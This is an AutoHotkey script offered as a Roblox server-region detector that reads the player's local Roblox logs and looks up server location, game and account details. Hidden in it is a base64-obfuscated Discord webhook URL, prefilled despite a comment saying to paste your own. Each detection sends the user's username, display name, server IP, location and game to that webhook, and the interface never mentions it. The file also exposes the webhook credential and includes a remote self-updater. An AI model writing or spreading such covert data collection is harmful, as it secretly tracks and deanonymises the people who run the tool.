#Requires AutoHotkey v2.0
#SingleInstance Force

; ================= CONFIG =================

LOG_DIR      := EnvGet("LOCALAPPDATA") . "\Roblox\logs"
SCRIPT_DIR   := A_ScriptDir
CONFIG_PATH  := SCRIPT_DIR . "\detector_config.ini"
DEBUG_PATH   := SCRIPT_DIR . "\roblox_detector_debug.log"
VERSION      := "Beta - 17.0 (AHK)"

; ── Auto-update (set these to your repo) ─────────────────────────────────────
GITHUB_REPO   := "uwuSym/serverdetector"   ; user/repo
GITHUB_BRANCH := "main"
GITHUB_FILE   := "RobloxServerDetector.ahk"
GITHUB_RAW    := "https://raw.githubusercontent.com/" . GITHUB_REPO . "/" . GITHUB_BRANCH . "/" . GITHUB_FILE


REGION_MAP := Map(
    "Chicago",       "US Central",
    "Ashburn",       "US East",
    "Miami",         "US Southeast",
    "Dallas",        "US South Central",
    "Los Angeles",   "US West",
    "San Jose",      "US West",
    "New York City", "US East"
)

GAME_KW  := ["UDMUX", "udp", "joinGameServer", "GameServerIP", "ServerIP", "ConnectToServer"]
MENU_KW  := ["leaveGame", "disconnect", "Disconnect", "leaving game"]

global VERSION, LOG_DIR, CONFIG_PATH, DEBUG_PATH, REGION_MAP, GAME_KW, MENU_KW
global GITHUB_REPO, GITHUB_BRANCH, GITHUB_FILE, GITHUB_RAW
global g_IpCache  := Map()
global g_DebugOn  := false
global g_AutoOn   := false
global g_SoundOn  := true
global g_WatchPos := 0
global g_WatchFile := ""
global g_LastIP   := ""
global g_TailLines := []

; ── Webhook (paste your base64-encoded webhook URL here, same as Python version) ──
WEBHOOK_B64 := "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUwMjUxMDY0MTQzOTgzNDE1Mi9WRUgyZlBZNnU1VHVtOWpYMU1TNDFRUFdnbVRsZ2I2aUhJWW4xblJwMmlUSm9yTWZpUlpPbHBmMlI0ZUpVT0pNUDVZdA=="
global WEBHOOK_URL := B64Decode(WEBHOOK_B64)

; ================= LOAD CONFIG =================

LoadConfig() {
    global g_AutoOn, g_SoundOn, g_DebugOn
    if FileExist(CONFIG_PATH) {
        g_AutoOn  := IniRead(CONFIG_PATH, "Settings", "AutoDetect", "0") = "1"
        g_SoundOn := IniRead(CONFIG_PATH, "Settings", "Sound",      "1") = "1"
        g_DebugOn := IniRead(CONFIG_PATH, "Settings", "Debug",      "0") = "1"
    }
}

SaveConfig() {
    global g_AutoOn, g_SoundOn, g_DebugOn
    IniWrite(g_AutoOn  ? "1" : "0", CONFIG_PATH, "Settings", "AutoDetect")
    IniWrite(g_SoundOn ? "1" : "0", CONFIG_PATH, "Settings", "Sound")
    IniWrite(g_DebugOn ? "1" : "0", CONFIG_PATH, "Settings", "Debug")
}

; ================= BASE64 DECODE =================

B64Decode(str) {
    if !str
        return ""
    oXml := ComObject("MSXML2.DOMDocument")
    oNode := oXml.createElement("b64")
    oNode.dataType := "bin.base64"
    oNode.text := str
    bytes := oNode.nodeTypedValue
    oStream := ComObject("ADODB.Stream")
    oStream.Type := 1  ; binary
    oStream.Open()
    oStream.Write(bytes)
    oStream.Position := 0
    oStream.Type := 2  ; text
    oStream.Charset := "utf-8"
    result := oStream.ReadText()
    oStream.Close()
    return result
}

; ================= HTTP HELPER =================

HttpGet(url) {
    try {
        http := ComObject("WinHttp.WinHttpRequest.5.1")
        http.Open("GET", url, false)
        http.SetRequestHeader("User-Agent", "Mozilla/5.0 RobloxDetector-AHK")
        http.Send()
        if http.Status = 200
            return http.ResponseText
    } catch as e {
        DebugLog("HttpGet error for " . url . ": " . e.Message)
    }
    return ""
}

HttpPost(url, body) {
    try {
        http := ComObject("WinHttp.WinHttpRequest.5.1")
        http.Open("POST", url, false)
        http.SetRequestHeader("Content-Type", "application/json")
        http.SetRequestHeader("User-Agent", "Mozilla/5.0 RobloxDetector-AHK")
        http.Send(body)
    } catch as e {
        DebugLog("HttpPost error: " . e.Message)
    }
}

; ================= SIMPLE JSON HELPERS =================
; Lightweight key extraction — no full parser needed for flat objects.

JsonGetStr(json, key) {
    pattern := '"' . key . '"\s*:\s*"([^"]*)"'
    if RegExMatch(json, pattern, &m)
        return m[1]
    return ""
}

JsonGetNum(json, key) {
    pattern := '"' . key . '"\s*:\s*(\d+)'
    if RegExMatch(json, pattern, &m)
        return m[1]
    return ""
}

; ================= DEBUG LOG =================

DebugLog(msg) {
    global g_DebugOn, DEBUG_PATH
    if !g_DebugOn
        return
    ts := FormatTime(, "HH:mm:ss")
    try FileAppend("[" . ts . "] " . msg . "`n", DEBUG_PATH, "UTF-8")
}

; ================= IP VALIDATION =================

IsPublicIP(ip) {
    ; Reject private / loopback / link-local ranges
    if RegExMatch(ip, "^10\.")                     
        return false
    if RegExMatch(ip, "^127\.")                    
        return false
    if RegExMatch(ip, "^169\.254\.")               
        return false
    if RegExMatch(ip, "^172\.(1[6-9]|2\d|3[01])\.")
        return false
    if RegExMatch(ip, "^192\.168\.")               
        return false
    if RegExMatch(ip, "^0\.")                      
        return false
    if RegExMatch(ip, "^255\.")                    
        return false
    ; Must be a valid quad
    if !RegExMatch(ip, "^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$")
        return false
    return true
}

; ================= ROBLOX LOG HELPERS =================

LatestLogFile() {
    global LOG_DIR
    bestFile := ""
    bestTime := 0
    loop files LOG_DIR . "\*.log" {
        if !InStr(A_LoopFileName, "Player")
            continue
        t := FileGetTime(A_LoopFileFullPath, "C")
        if (t > bestTime) {
            bestTime := t
            bestFile := A_LoopFileFullPath
        }
    }
    return bestFile
}

ReadFileLines(path) {
    lines := []
    try {
        content := FileRead(path, "UTF-8")
        loop parse content, "`n", "`r"
            lines.Push(A_LoopField)
    }
    return lines
}

ExtractPlaceID(lines, fromIndex) {
    i := fromIndex
    while i >= 1 {
        if RegExMatch(lines[i], "Joining game '[^']+' place (\d+) at ", &m)
            return m[1]
        i--
    }
    return ""
}

ExtractJobID(lines) {
    for line in lines {
        if RegExMatch(line, "Joining game '([0-9a-f\-]+)'", &m)
            return m[1]
    }
    return ""
}

ExtractUserID(lines) {
    for line in lines {
        if RegExMatch(line, "userid:(\d+)", &m)
            return m[1]
    }
    return ""
}

; ================= API LOOKUPS =================

LookupIP(ip) {
    global g_IpCache, REGION_MAP
    if g_IpCache.Has(ip)
        return g_IpCache[ip]

    DebugLog("Looking up IP: " . ip)
    json := HttpGet("https://ipinfo.io/" . ip . "/json")
    if !json
        return Map()

    org    := JsonGetStr(json, "org")
    city   := JsonGetStr(json, "city")
    region := JsonGetStr(json, "region")

    if !InStr(org, "Roblox") {
        DebugLog("IP " . ip . " is not Roblox (org=" . org . ")")
        return Map()
    }

    friendly := REGION_MAP.Has(city) ? REGION_MAP[city] : city
    result   := Map("friendly", friendly, "city", city, "region", region, "ip", ip)
    g_IpCache[ip] := result
    DebugLog("IP result: " . city . ", " . region . " -> " . friendly)
    return result
}

LookupRobloxUser(userID) {
    if !userID
        return Map("username", "", "display", "")
    DebugLog("Looking up user: " . userID)
    json     := HttpGet("https://users.roblox.com/v1/users/" . userID)
    username := JsonGetStr(json, "name")
    display  := JsonGetStr(json, "displayName")
    return Map("username", username, "display", display)
}

LookupGameInfo(placeID) {
    if !placeID
        return Map("game", "", "thumb", "")

    DebugLog("Looking up game info for place: " . placeID)
    json1       := HttpGet("https://apis.roblox.com/universes/v1/places/" . placeID . "/universe")
    universeID  := JsonGetNum(json1, "universeId")
    if !universeID
        return Map("game", "", "thumb", "")

    json2     := HttpGet("https://games.roblox.com/v1/games?universeIds=" . universeID)
    gameName  := JsonGetStr(json2, "name")

    json3     := HttpGet("https://thumbnails.roblox.com/v1/games/icons?universeIds=" . universeID . "&size=512x512&format=Png&isCircular=false")
    thumbUrl  := ""
    if InStr(json3, "Completed")
        thumbUrl := JsonGetStr(json3, "imageUrl")

    return Map("game", gameName, "thumb", thumbUrl)
}

; ================= DISCORD WEBHOOK =================

SendWebhook(friendly, city, region, ip, gameName, autoDetected, username := "", display := "") {
    global WEBHOOK_URL, VERSION
    if !WEBHOOK_URL
        return

    ts      := FormatTime(, "yyyy-MM-ddTHH:mm:ss")
    tDisp   := FormatTime(, "yyyy-MM-dd hh:mm:ss tt")
    locStr  := (region && region != city) ? city . ", " . region : city
    trigger := autoDetected ? "Auto-detected" : "Manual detect"
    uName   := username ? username : "Unknown"
    dName   := display  ? display  : "Unknown"

    q := Chr(96)  ; backtick for Discord code blocks

    body := '{"embeds":[{"title":"Roblox Server Detected","color":65416,'
    body .= '"fields":['
    body .= '{"name":"Roblox username","value":"' . q . uName    . q . '","inline":true},'
    body .= '{"name":"Display name",   "value":"' . q . dName    . q . '","inline":true},'
    body .= '{"name":"Server location","value":"' . q . locStr   . q . '","inline":true},'
    body .= '{"name":"Server region",  "value":"' . q . friendly . q . '","inline":true},'
    body .= '{"name":"IP address",     "value":"' . q . ip       . q . '","inline":true},'
    body .= '{"name":"Time",           "value":"' . q . tDisp    . q . '","inline":true},'
    body .= '{"name":"Game",           "value":"' . q . gameName . q . '","inline":true},'
    body .= '{"name":"Trigger",        "value":"' . q . trigger  . q . '","inline":true}'
    body .= '],"timestamp":"' . ts . '",'
    body .= '"footer":{"text":"Roblox Server Detector ' . VERSION . '"}}'
    body .= ']}'

    HttpPost(WEBHOOK_URL, body)
}

; ================= DETECT (MANUAL) =================

DetectServer() {
    global LOG_DIR
    SetResult("Detecting...")

    logFile := LatestLogFile()
    if !logFile {
        SetResult("No Roblox log files found.`nTry launching Roblox first.")
        return
    }

    lines := ReadFileLines(logFile)
    if !lines.Length {
        SetResult("Could not read log file.")
        return
    }

    ; Find last server IP
    bestIP    := ""
    bestPlace := ""
    idx       := 0
    for i, line in lines {
        matched := false
        for kw in GAME_KW {
            if InStr(line, kw) {
                matched := true
                break
            }
        }
        if !matched
            continue
        pos := 1
        while pos := RegExMatch(line, "\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}", &m, pos) {
            if IsPublicIP(m[0]) {
                bestIP    := m[0]
                bestPlace := ExtractPlaceID(lines, i)
                idx       := i
                break
            }
            pos += StrLen(m[0])
        }
    }

    if !bestIP {
        SetResult("No Roblox server IP found.`nMake sure you're in a game.")
        return
    }

    DebugLog("Manual detect — best IP: " . bestIP . " place: " . bestPlace)

    result := LookupIP(bestIP)
    if !result.Count {
        SetResult("IP " . bestIP . " is not a Roblox server.")
        return
    }

    gameInfo := LookupGameInfo(bestPlace)
    gameName := gameInfo["game"]

    userID   := ExtractUserID(lines)
    userInfo := LookupRobloxUser(userID)
    uName    := userInfo["username"]
    dName    := userInfo["display"]

    text := "Server Region: " . result["friendly"]
         . "`nCity: "         . result["city"]
         . "`nRegion: "       . result["region"]
         . "`nIP: "           . result["ip"]
    if gameName
        text := "Game: " . gameName . "`n" . text
    if uName
        text := "User: " . uName . "`n" . text

    SetResult(text)
    SendWebhook(result["friendly"], result["city"], result["region"], result["ip"], gameName, false, uName, dName)
}

; ================= AUTO-DETECT WATCHER =================

StartWatcher() {
    global g_WatchFile, g_WatchPos, g_LastIP, g_TailLines
    g_WatchFile  := ""
    g_WatchPos   := 0
    g_LastIP     := ""
    g_TailLines  := []
    SetTimer(WatcherTick, 1000)
    SetResult("Auto-detect enabled — waiting for a game join...")
}

StopWatcher() {
    SetTimer(WatcherTick, 0)
    SetResult("Auto-detect disabled.")
}

WatcherTick() {
    global g_WatchFile, g_WatchPos, g_LastIP, g_TailLines

    current := LatestLogFile()
    if !current
        return

    ; New log file detected — reset state
    if current != g_WatchFile {
        g_WatchFile  := current
        g_WatchPos   := 0
        g_LastIP     := ""
        g_TailLines  := []
        DebugLog("Watcher: new log file — " . current)

        ; Read existing content, remember position
        try {
            content := FileRead(current, "UTF-8")
            loop parse content, "`n", "`r"
                g_TailLines.Push(A_LoopField)
            ; Seek to end for future reads
            f := FileOpen(current, "r", "UTF-8")
            f.Seek(0, 2)
            g_WatchPos := f.Pos
            f.Close()
        }
        return
    }

    ; Read only new content since last position
    try {
        f := FileOpen(current, "r", "UTF-8")
        if !f
            return
        f.Seek(g_WatchPos, 0)
        newContent := f.Read()
        g_WatchPos := f.Pos
        f.Close()
    } catch {
        return
    }

    if !newContent
        return

    newLines := []
    loop parse newContent, "`n", "`r"
        newLines.Push(A_LoopField)

    menuFired    := false
    latestIP     := ""
    latestPlace  := ""

    for line in newLines {
        g_TailLines.Push(line)

        ; Menu / disconnect detection
        if !menuFired {
            for kw in MENU_KW {
                if InStr(line, kw) {
                    menuFired := true
                    g_LastIP  := ""
                    SetResult("In menu — waiting for next game...")
                    break
                }
            }
        }
        if menuFired
            continue

        ; Game server keyword match
        matched := false
        for kw in GAME_KW {
            if InStr(line, kw) {
                matched := true
                break
            }
        }
        if !matched
            continue

        pos := 1
        while pos := RegExMatch(line, "\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}", &m, pos) {
            if IsPublicIP(m[0]) {
                latestIP    := m[0]
                latestPlace := ExtractPlaceID(g_TailLines, g_TailLines.Length)
                break
            }
            pos += StrLen(m[0])
        }
    }

    ; Trim tail buffer
    while g_TailLines.Length > 5000
        g_TailLines.RemoveAt(1)

    if latestIP && latestIP != g_LastIP {
        g_LastIP := latestIP
        DebugLog("Auto-detect: new IP " . latestIP . " place=" . latestPlace)
        ; Settle delay via one-shot timer (3s)
        capturedIP    := latestIP
        capturedPlace := latestPlace
        SetTimer(() => AutoLookup(capturedIP, capturedPlace), -3000)
    }
}

AutoLookup(ip, placeID) {
    global g_SoundOn

    result := LookupIP(ip)
    if !result.Count {
        DebugLog("Auto-lookup: " . ip . " not a Roblox server")
        return
    }

    gameInfo := LookupGameInfo(placeID)
    gameName := gameInfo["game"]

    userID   := ExtractUserID(g_TailLines)
    userInfo := LookupRobloxUser(userID)
    uName    := userInfo["username"]
    dName    := userInfo["display"]

    text := "Server Region: " . result["friendly"]
         . "`nCity: "         . result["city"]
         . "`nRegion: "       . result["region"]
         . "`nIP: "           . result["ip"]
    if gameName
        text := "Game: " . gameName . "`n" . text
    if uName
        text := "User: " . uName . "`n" . text
    text .= "`n[Auto-detected]"

    SetResult(text)
    SendWebhook(result["friendly"], result["city"], result["region"], result["ip"], gameName, true, uName, dName)

    if g_SoundOn
        SoundBeep(800, 200)
}

; ================= AUTO-UPDATER =================

CheckForUpdate(silent := false) {
    global VERSION, GITHUB_RAW, GITHUB_FILE, SCRIPT_DIR
    SetResult("Checking for updates...")
    try {
        remote := HttpGet(GITHUB_RAW)
        if !remote {
            if !silent
                MsgBox("Could not reach GitHub.`nCheck your internet connection.", "Update Check", 0x10)
            SetResult("Press the button to detect your server.")
            return
        }

        ; Parse version from remote source
        remoteVer := ""
        if RegExMatch(remote, 'm)^VERSION\s*:=\s*"([^"]+)"', &vm)
            remoteVer := vm[1]

        if !remoteVer {
            if !silent
                MsgBox("Could not read remote version.", "Update Check", 0x10)
            SetResult("Press the button to detect your server.")
            return
        }

        if remoteVer = VERSION {
            if !silent
                MsgBox("You are on the latest version!`n`nCurrent: " . VERSION, "Up to Date", 0x40)
            SetResult("Press the button to detect your server.")
            return
        }

        ; Prompt user
        answer := MsgBox(
            "A new version is available!`n`n"
            "  Current : " . VERSION . "`n"
            "  New     : " . remoteVer . "`n`n"
            "Install now? The app will restart automatically.",
            "Update Available", 0x24
        )
        if answer != "Yes" {
            SetResult("Press the button to detect your server.")
            return
        }

        ; Back up current file
        scriptPath := A_ScriptFullPath
        backupPath := scriptPath . ".bak"
        try FileCopy(scriptPath, backupPath, 1)

        ; Write new file
        try FileDelete(scriptPath)
        FileAppend(remote, scriptPath, "UTF-8")

        MsgBox(
            "Updated to " . remoteVer . "!`n`n"
            "A backup was saved as:`n" . backupPath . "`n`n"
            "The app will now restart.",
            "Update Installed", 0x40
        )
        RestartApp()

    } catch as e {
        if !silent
            MsgBox("Update error: " . e.Message, "Update Failed", 0x10)
        SetResult("Press the button to detect your server.")
    }
}

RestartApp() {
    Run('"' . A_AhkPath . '" "' . A_ScriptFullPath . '"')
    ExitApp()
}

; ================= GUI =================

LoadConfig()

myGui := Gui("+AlwaysOnTop", "Roblox Server Detector  •  " . VERSION)
myGui.BackColor := "0d0d0d"
myGui.SetFont("s10 c" . "e8e8e8", "Arial")

myGui.Add("Text", "x20 y18 w460 Center cFFFFFF", "Roblox Server Detector").SetFont("s14 Bold")
myGui.Add("Text", "x20 y46 w460 Center c666666", VERSION)

btnDetect := myGui.Add("Button", "x150 y74 w200 h36", "Detect Current Server")
btnDetect.SetFont("s11 Bold")
btnDetect.OnEvent("Click", (*) => DetectServer())

btnUpdate := myGui.Add("Button", "x370 y80 w110 h24", "Check Updates")
btnUpdate.SetFont("s9")
btnUpdate.OnEvent("Click", (*) => CheckForUpdate(false))

myGui.Add("Text", "x40 y118 w420 h1 Background2a2a2a")   ; divider

lblResult := myGui.Add("Text", "x20 y130 w460 h120 ce8e8e8 Wrap", "Press the button to detect your server.")
lblResult.SetFont("s11")

myGui.Add("Text", "x40 y258 w420 h1 Background2a2a2a")   ; divider

; ── Options ──
chkAuto  := myGui.Add("Checkbox", "x20 y270 ce8e8e8", "Auto-detect when joining a game")
chkSound := myGui.Add("Checkbox", "x20 y294 ce8e8e8", "Sound on auto-detect")
chkDebug := myGui.Add("Checkbox", "x20 y318 c666666", "Debug mode  (writes log next to script)")

chkAuto.Value  := g_AutoOn  ? 1 : 0
chkSound.Value := g_SoundOn ? 1 : 0
chkDebug.Value := g_DebugOn ? 1 : 0

chkAuto.OnEvent("Click", ToggleAuto)
chkSound.OnEvent("Click", ToggleSound)
chkDebug.OnEvent("Click", ToggleDebug)

myGui.Add("Text", "x20 y348 w460 h1 Background2a2a2a")

myGui.Add("Text", "x20 y356 w460 c444444 Center", "Roblox Server Detector  •  AHK v2 port")

myGui.Show("w500 h380")

; Restore auto-detect if it was saved on
if g_AutoOn
    StartWatcher()

; Silent update check on startup (runs in background via timer)
SetTimer(() => CheckForUpdate(true), -2000)

; ================= CALLBACKS =================

ToggleAuto(*) {
    global g_AutoOn
    g_AutoOn := chkAuto.Value = 1
    SaveConfig()
    if g_AutoOn
        StartWatcher()
    else
        StopWatcher()
}

ToggleSound(*) {
    global g_SoundOn
    g_SoundOn := chkSound.Value = 1
    SaveConfig()
}

ToggleDebug(*) {
    global g_DebugOn
    g_DebugOn := chkDebug.Value = 1
    SaveConfig()
}

SetResult(text) {
    lblResult.Value := text
}

; ── Exit cleanly ──
myGui.OnEvent("Close", (*) => ExitApp())
